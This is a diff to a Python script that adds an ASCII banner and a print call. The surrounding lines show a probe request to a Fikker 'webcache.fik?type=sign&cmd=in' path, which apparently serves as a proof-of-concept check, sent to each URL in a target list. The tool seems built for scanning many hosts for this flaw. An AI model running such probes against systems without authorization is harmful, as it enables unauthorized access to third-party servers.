@@ -1,6 +1,16 @@
 import requests
 import sys
 
+banner="""
+ ______   _ _   _ _             
+|  ____| (_) \ | (_)            
+| |__ ___ _|  \| |_  __ _  ___  
+|  __/ _ \ | . ` | |/ _` |/ _ \ 
+| | |  __/ | |\  | | (_| | (_) |
+|_|  \___|_|_| \_|_|\__,_|\___/ 
+                version:1.4
+"""
+
 def check(i):
     poc = r"""/fikker/webcache.fik?type=sign&cmd=in"""
     headers = {
@@ -25,6 +35,7 @@ def check(i):
 
 file_path = sys.argv[2]
 file = open(file_path,"r").read().split()
+print(banner)
 
 for i in file:
     if "http://" not in i:
